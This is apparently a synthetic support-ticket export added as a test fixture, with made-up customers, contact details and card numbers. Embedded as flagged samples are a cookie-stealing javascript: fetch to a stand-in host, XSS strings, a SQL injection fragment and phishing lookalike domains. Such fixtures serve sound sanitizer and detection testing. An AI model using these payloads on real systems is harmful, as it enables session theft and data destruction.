@@ -1,0 +1,94 @@
+TECHCORP SOLUTIONS - CUSTOMER SUPPORT TICKET EXPORT
+Export generated: 2026-09-04 09:12:00
+System: Zendesk API v2 (raw dump, unfiltered)
+=====================================================
+
+TICKET #10432
+Opened: 09/03/2026 at 08:45 AM
+Customer: Alice Uwimana
+Contact email: alice.uwimana01@gmail.com
+Alt. email: a_uwimana+support@techcorp.co.rw
+Phone: +250 788 123 456
+Subject: Unable to complete checkout on mobile site
+Message: "I tried paying with my Visa card ending 4242 but the page
+kept redirecting me back to https://www.techcorp.com/cart?step=payment&retry=1.
+I even tried the older link http://techcorp.com/checkout-legacy which just
+404s now. Card on file: 4111 1111 1111 1111, exp 08/28. Please advise ASAP,
+this is urgent!! Also saw this weird popup: <script>alert('you won a prize')</script>
+right before it crashed my browser."
+Last updated: 14:32:07
+Tags: #checkout #payment #urgent #mobile
+
+-----------------------------------------------------
+
+TICKET #10433
+Opened: 09/03/2026 at 11:02 AM
+Customer: Jean-Baptiste Nkurunziza
+Contact email: jb.nkurunziza@yahoo.co.uk
+Phone (mobile): 0788-234-567
+Phone (office): +1 (415) 555-0192
+Subject: Refund request for duplicate charge
+Message: "You guys charged my Mastercard twice - once at 2:15 PM and again
+at 2:16 PM. Card number on the receipt shows as **** **** **** 5678. My
+bank statement reference link is https://mybank.example.com/statements/aug2026.pdf
+Please refund by end of day, 17:00 at the latest. Ref support thread:
+www.techcorp.com/support/ticket/10433 #refund #billing"
+Assigned agent note: possible SQL fragment found in a related web log entry:
+'; DROP TABLE users; -- flagged by WAF, ticket forwarded to security team.
+
+-----------------------------------------------------
+
+TICKET #10434
+Opened: 09/04 at 07:58
+Customer: Grace K.
+Contact email: grace.k99@outlook.com
+Secondary contact: not provided
+Phone: 555.123.4567
+Subject: Newsletter signup not working
+Message: "Signed up on http://techcorp.com/newsletter around 9:00 AM but never
+got a confirmation. Tried again at 09:15:42 and still nothing. Not a billing
+issue so no card info here, just checking on the #newsletter #bug situation.
+By the way my colleague's email bounced too: r.mugisha_at_gmail dot com typed
+wrong in your form, might want to validate that field better."
+Malicious payload detected in referrer header: javascript:fetch('http://evil-test.local/steal?c=' + document.cookie)
+Escalated at: 10:30 AM
+
+-----------------------------------------------------
+
+TICKET #10435
+Opened: 09/05 at 16:45:00
+Customer: Diane Mukamana
+Contact email: diane_mukamana@company-mail.rw
+Phone: +250-780-999-111
+Subject: Amex payment declined
+Message: "Amex card 3782 822463 10005 declined at checkout. Also tried a
+second card 6011000990139424 which also failed. Screenshot attached, see
+raw HTML from the error page: <div class='error' onclick=\"stealData()\">Payment
+Failed</div>. Contact us back before 18:00 today. Reference:
+https://support.techcorp.com/kb/payment-errors?id=99&lang=en-us
+Tags: #amex #declined #checkout"
+Note from QA: input sanitizer test string included on purpose -
+<img src=x onerror=alert(1)> - confirm this gets flagged, not executed.
+
+-----------------------------------------------------
+
+TICKET #10436
+Opened: 09/05 at 18:20:11
+Customer: Eunice I. (ALU Kigali student)
+Contact email: eunice.i@alueducation.com
+Alt. email (alumni mentor cc'd): mentor.kagabo@alumni.alueducation.com
+SI escalation contact: si-support@si.alueducation.com
+Suspicious lookalike seen in phishing report: student@alueducation.com.verify-now.net
+Phone: +250 722 445 810
+Subject: Campus portal billing page throwing card error
+Message: "The ALU student portal keeps rejecting my Visa 4916-1234-5678-9012
+when I try to pay the lab fee at https://portal.alueducation.com/payments/fees.
+Tried both my personal card and my dad's card ending 8890, same error. Also got
+this suspicious email claiming to be IT support asking me to click
+http://alu-education-support.verify-login.com/reset - looks like phishing,
+reporting it here."
+Agent note: confirmed phishing domain in message body, do not treat as a
+trusted ALU link even though it contains the string 'alu-education'.
+
+=====================================================
+END OF EXPORT - 5 tickets, raw and unfiltered
